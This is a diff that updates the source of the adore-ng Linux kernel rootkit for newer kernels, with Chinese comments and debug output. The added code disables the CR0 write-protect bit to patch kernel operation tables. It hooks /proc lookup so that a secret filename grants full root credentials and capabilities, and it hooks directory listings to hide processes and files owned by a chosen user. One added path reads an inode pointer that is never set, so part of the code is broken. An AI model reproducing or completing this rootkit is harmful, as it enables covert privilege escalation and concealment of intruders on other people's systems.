@@ -41,6 +41,7 @@
 #include <linux/pid.h>
 #include <linux/init.h>
 #include <linux/seq_file.h>
+#include <linux/cred.h>
 
 #include <net/sock.h>
 #include <net/tcp.h>
@@ -52,6 +53,32 @@
 #include <linux/version.h>
 
 #include "adore-ng.h"
+
+unsigned orig_cr0;
+/*清除cr0寄存器的写保护位，第16位为WP写保护位*/
+unsigned clear_return_cr0(void)
+{
+	unsigned cr0 = 0;
+	unsigned ret;
+	asm volatile ("movl %%cr0, %%eax"
+	:"=a"(cr0)
+	);
+	ret = cr0;
+	cr0 &= 0xfffeffff;
+	asm volatile ("movl %%eax, %%cr0"
+	:
+	:"a"(cr0)
+	);
+	return ret;
+}
+/*用orig_cr0恢复cr0寄存器*/
+void setback_cr0(unsigned val)
+{
+	asm volatile ("movl %%eax, %%cr0"
+	:
+	:"a"(val)
+	);
+}
 
 char *proc_fs = "/proc";	/* default proc FS to hide processes */
 char *root_fs = "/";		/* default FS to hide files */
@@ -117,7 +144,7 @@ int adore_atoi(const char *str)
 /* Own implementation of find_task_by_pid() */
 struct task_struct *adore_find_task(pid_t pid)
 {
-	struct task_struct *p;
+	struct task_struct *p;  
 
 	//read_lock(&tasklist_lock);	
 	for_each_task(p) {
@@ -165,49 +192,27 @@ int should_be_hidden(pid_t pid)
 struct dentry *adore_lookup(struct inode *i, struct dentry *d,
                             struct nameidata *nd)
 {
-    struct cred *edit_cred = (struct cred *)current->cred;
-
+	struct cred *edit_cred = (struct cred *)current->cred;
 	task_lock(current);
 
 	if (strncmp(ADORE_KEY, d->d_iname, strlen(ADORE_KEY)) == 0) {
+		printk("和adore——key匹配成功\n");
 		current->flags |= PF_AUTH;
-		//current->suid = ADORE_VERSION;
-        edit_cred->suid = ADORE_VERSION;
+		edit_cred->suid = ADORE_VERSION;
 	} else if ((current->flags & PF_AUTH) &&
 		   strncmp(d->d_iname, "fullprivs", 9) == 0) {
-/*		current->uid = 0;
-		current->suid = 0;
-		current->euid = 0;
-	    	current->gid = 0;
-		current->egid = 0;
-	    	current->fsuid = 0;
-		current->fsgid = 0;
+		printk("超级用户权限\n");
+		edit_cred->uid = 0;
+		edit_cred->suid = 0;
+		edit_cred->euid = 0;
+	    	edit_cred->gid = 0;
+		edit_cred->egid = 0;
+	    	edit_cred->fsuid = 0;
+		edit_cred->fsgid = 0;
 
-		cap_set_full(current->cap_effective);
-		cap_set_full(current->cap_inheritable);
-		cap_set_full(current->cap_permitted);
-*/
-
-            edit_cred->uid = 0;
-
-              edit_cred->suid = 0;
-
-              edit_cred->euid = 0;
-
-           edit_cred->gid = 0;
-
-              edit_cred->egid = 0;
-
-           edit_cred->fsuid = 0;
-
-              edit_cred->fsgid = 0;
-
-
-              cap_set_full(edit_cred->cap_effective);
-
-              cap_set_full(edit_cred->cap_inheritable);
-
-              cap_set_full(edit_cred->cap_permitted);
+		cap_set_full(edit_cred->cap_effective);
+		cap_set_full(edit_cred->cap_inheritable);
+		cap_set_full(edit_cred->cap_permitted);
 	} else if ((current->flags & PF_AUTH) &&
 	           strncmp(d->d_iname, "hide-", 5) == 0) {
 		hide_proc(adore_atoi(d->d_iname+5));
@@ -233,7 +238,7 @@ struct dentry *adore_lookup(struct inode *i, struct dentry *d,
 filldir_t proc_filldir = NULL;
 spinlock_t proc_filldir_lock = SPIN_LOCK_UNLOCKED;
 
-int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
+int adore_proc_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
 {
 	char abuf[128];
 
@@ -263,40 +268,70 @@ int adore_proc_readdir(struct file *fp, void *buf, filldir_t filldir)
 
 
 filldir_t opt_filldir = NULL;
-struct super_block *opt_sb[1024];
+//struct super_block *opt_sb[1024];
+struct dentry *parent_opt_dir[1024];
 
-int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
+int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
 {
 	struct inode *inode = NULL;
+	struct dentry *dentry = NULL;
+	struct qstr this;
+	struct dentry *dir = parent_opt_dir[current->pid % 1024];
 	int r = 0;
 	uid_t uid;
 	gid_t gid;
-	char reiser = 0;
-
+/*
 	if (!opt_sb[current->pid % 1024])
 		return 0;
 
 	// reiserFS workaround
 	reiser = (strcmp(opt_sb[current->pid % 1024]->s_type->name, "reiserfs") == 0);
-
 	if (reiser) {
 		if ((inode = iget_locked(opt_sb[current->pid % 1024], ino)) == NULL)
 			return 0;
 	} else {
-		if ((inode = iget(opt_sb[current->pid % 1024], ino)) == NULL)
+		if ((inode = iget_locked(opt_sb[current->pid % 1024], ino)) == NULL)
 			return 0;
 	}
+*/
 
+	if (!dir)
+		return 0;
+	this.name = name;
+	this.len = nlen;
+	this.hash = full_name_hash(this.name, this.len);
+	dentry  = d_lookup(dir, &this);
+	if (!dentry) {
+		dentry = d_alloc(dir, &this);
+		if (!dentry) {
+			//printk("d_alloc失败%d\n", (int)dentry);
+			return 0;
+		}
+		//printk("%d\n", (int)(dentry->d_inode));
+		if (!dir->d_inode->i_op->lookup)
+			return 0;
+		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
+			//printk("lookup错误\n");
+			return 0;
+		}
+	}
+	if(!(inode = dentry->d_inode)) {
+	//printk("inode获取失败\n");
+	return 0;
+	}
+	
 	uid = inode->i_uid;
 	gid = inode->i_gid;
-
+	iput(inode);
+	dput(dentry);
+/*
 	if (reiser) {
 		if (inode->i_state & I_NEW)
 			unlock_new_inode(inode);
 	}
 
 	iput(inode);
-
+*/
 	/* Is it hidden ? */
 	if (uid == ELITE_UID && gid == ELITE_GID) {
 		r = 0;
@@ -311,12 +346,11 @@ int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
 
-	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf ||
-	    !filldir || !orig_opt_readdir)
+	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
 		return 0;
 
 	opt_filldir = filldir;
-	opt_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
+	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
 	r = orig_opt_readdir(fp, buf, adore_opt_filldir);
 	
 	return r;
@@ -340,19 +374,20 @@ int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
  * must be met) should be very very rare.
  */
 filldir_t root_filldir = NULL;
-struct super_block *root_sb[1024];
+//struct super_block *root_sb[1024];
+struct dentry *parent_dir[1024];
 
-
-int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t ino, unsigned x)
+int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino, unsigned x)
 {
 	struct inode *inode = NULL;
+	struct dentry *dentry = NULL;
+	struct qstr this;
+	struct dentry *dir = parent_dir[current->pid % 1024];
 	int r = 0;
 	uid_t uid;
 	gid_t gid;
-	char reiser = 0;
 
-
-	if (!root_sb[current->pid % 1024])
+	if (!dir)
 		return 0;
 
 	/* Theres an odd 2.6 behaivior. iget() crashes on ReiserFS! using iget_locked
@@ -360,25 +395,56 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t 
 	 * time to time. So I basically emulate iget() without
 	 * the sb->s_op->read_inode(inode); and so it doesnt crash or deadlock.
 	 */
-	reiser = (strcmp(root_sb[current->pid % 1024]->s_type->name, "reiserfs") == 0);
-	if (reiser) {
-		if ((inode = iget_locked(root_sb[current->pid % 1024], ino)) == NULL)
+	 
+	/*下面的代码可以用这个代替，但是内核警告说最好不要用这个函数
+	 *struct dentry *lookup_one_len(const char *name, struct dentry *base, int len)
+	 */
+	this.name = name;
+	this.len = nlen;
+	this.hash = full_name_hash(this.name, this.len);
+	dentry  = d_lookup(dir, &this);
+	if (!dentry) {
+		dentry = d_alloc(dir, &this);
+		if (!dentry) {
+			//printk("d_alloc失败%d\n", (int)dentry);
 			return 0;
-	} else {
-		if ((inode = iget(root_sb[current->pid % 1024], ino)) == NULL)
+		}
+		//printk("%d\n", (int)(dentry->d_inode));
+		if (!dir->d_inode->i_op->lookup)
 			return 0;
+		if(dir->d_inode->i_op->lookup(dir->d_inode, dentry, NULL) != 0) {
+			printk("lookup错误\n");
+			return 0;
+		}
 	}
-
+	//if(!(inode = dentry->d_inode)) {
+	//printk("inode获取失败\n");
+	//return 0;
+	//}
+	
 	uid = inode->i_uid;
 	gid = inode->i_gid;
+	
+	iput(inode);
+	dput(dentry);
+	/*
+	if ((inode = iget_locked(root_sb[current->pid % 1024], ino)) == NULL)
+		return 0;
+		
+	uid = inode->i_uid;
+	gid = inode->i_gid;
+	
+	//printk("%d,%d,%d\n", uid, gid, inode->i_nlink);
+	//printk("文件大小%lld,%d,i节点号%lld\n", inode->i_size, atomic_read(&(inode->i_count)), ino);
 
-	if (reiser) {
-		if (inode->i_state & I_NEW)
-			unlock_new_inode(inode);
+	if (inode->i_state & I_NEW) {
+		unlock_new_inode(inode);
+		//printk("%lu\n", (unsigned long)inode);
+		inode->i_state |= I_NEW;
 	}
 
 	iput(inode);
-
+	*/
 	/* Is it hidden ? */
 	if (uid == ELITE_UID && gid == ELITE_GID) {
 		r = 0;
@@ -389,17 +455,15 @@ int adore_root_filldir(void *buf, const char *name, int nlen, loff_t off, ino_t 
 	return r;
 }
 
-
 int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
 
-	if (!fp || !fp->f_vfsmnt || !fp->f_vfsmnt->mnt_sb || !buf ||
-	    !filldir || !orig_root_readdir)
+	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
 		return 0;
 
 	root_filldir = filldir;
-	root_sb[current->pid % 1024] = fp->f_vfsmnt->mnt_sb;
+	parent_dir[current->pid % 1024] = fp->f_dentry;
 	r = orig_root_readdir(fp, buf, adore_root_filldir);
 	
 	return r;
@@ -418,10 +482,15 @@ int patch_vfs(const char *p, readdir_t *orig_readdir, readdir_t new_readdir)
 	if (orig_readdir)
 		*orig_readdir = filep->f_op->readdir;
 
-	new_op = filep->f_op;
+	new_op = (struct file_operations *)filep->f_op;
 	new_op->readdir = new_readdir;
+	
+	printk("patch开始，地址%x旧read地址%x，新read地址%x,地址%x\n",
+		(unsigned)filep->f_op->readdir,
+		(unsigned)*orig_readdir,
+		(unsigned)(new_op->readdir),
+		(unsigned)new_readdir);
 
-	//filep->f_op->readdir = new_readdir;
 	filep->f_op = new_op;
 	filp_close(filep, 0);
 	return 0;
@@ -437,11 +506,14 @@ int unpatch_vfs(const char *p, readdir_t orig_readdir)
                 return -1;
 	}
 
-        new_op = filep->f_op;
+        new_op = (struct file_operations *)filep->f_op;
         new_op->readdir = orig_readdir;
 
-	filep->f_op = new_op;
-	//filep->f_op->readdir = orig_readdir;
+	printk("unpatch开始，地址%x旧read地址%x，新read地址%x\n",
+		(unsigned)filep->f_op->readdir,
+		(unsigned)*orig_readdir,
+		(unsigned)(new_op->readdir));
+		
 	filp_close(filep, 0);
 	return 0;
 }
@@ -499,13 +571,27 @@ int __init adore_init(void)
 	struct file_operations *new_op;
 	struct inode_operations *new_inode_op;
 	int i = 0, j = 0;
-
+	struct file *filep;
+	
 	memset(hidden_procs, 0, sizeof(hidden_procs));
 
-	orig_proc_lookup = proc_root.proc_iops->lookup;
-	new_inode_op = proc_root.proc_iops;
+        filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
+	if (IS_ERR(filep)) {
+		printk("打开proc失败\n");
+                return -1;
+	}
+	
+	orig_cr0 = clear_return_cr0();
+
+	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
+	orig_proc_lookup = new_inode_op->lookup;
 	new_inode_op->lookup = adore_lookup;
-	proc_root.proc_iops = new_inode_op;
+
+	/*proc_root已经不export了*/
+	//orig_proc_lookup = proc_root.proc_iops->lookup;
+	//new_inode_op = proc_root.proc_iops;
+	//new_inode_op->lookup = adore_lookup;
+
 	//proc_root.proc_iops->lookup = adore_lookup;
 
 	patch_vfs(proc_fs, &orig_proc_readdir, adore_proc_readdir);
@@ -524,14 +610,16 @@ int __init adore_init(void)
 		}
 		if (!j) {	/* just replace one time, its all the same FS */
 			orig_var_write = var_files[i]->f_op->write;
-			new_op = var_files[i]->f_op;
-			new_op->write = adore_var_write;
-			var_files[i]->f_op = new_op;
+			new_op = (struct file_operations *)var_files[i]->f_op;
+			//new_op->write = adore_var_write;
+		
 			//var_files[i]->f_op->write = adore_var_write;
 			j = 1;
 		}
 	}
+	filp_close(filep, 0);
 
+	setback_cr0(orig_cr0);
 	return 0;
 }
 
@@ -541,9 +629,22 @@ void __exit adore_cleanup(void)
         struct inode_operations *new_inode_op;
 	int i = 0, j = 0;
 
-        new_inode_op = proc_root.proc_iops;
-        new_inode_op->lookup = orig_proc_lookup;
-        proc_root.proc_iops = new_inode_op;
+	struct file *filep;
+
+        filep = filp_open(proc_fs, O_RDONLY|O_DIRECTORY, 0);
+	if (IS_ERR(filep)) {
+		printk("打开proc失败\n");
+                return ;
+	}
+	
+	orig_cr0 = clear_return_cr0();
+	
+	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
+	new_inode_op->lookup = orig_proc_lookup;
+
+        //new_inode_op = proc_root.proc_iops;
+        //new_inode_op->lookup = orig_proc_lookup;
+
 	//proc_root.proc_iops->lookup = orig_proc_lookup;
 
 	unpatch_vfs(proc_fs, orig_proc_readdir);
@@ -556,16 +657,18 @@ void __exit adore_cleanup(void)
 	for (i = 0; var_filenames[i]; ++i) {
 		if (var_files[i]) {
 			if (!j) {
-				new_op = var_files[i]->f_op;
-				new_op->write = orig_var_write;
+				new_op = (struct file_operations *)var_files[i]->f_op;
+				//new_op->write = orig_var_write;
 
-				var_files[i]->f_op = new_op;
 				//var_files[i]->f_op->write = orig_var_write;
 				j = 1;
 			}
 			filp_close(var_files[i], 0);
 		}
 	}
+	
+	filp_close(filep, 0);
+	setback_cr0(orig_cr0);
 }
 
 module_init(adore_init);
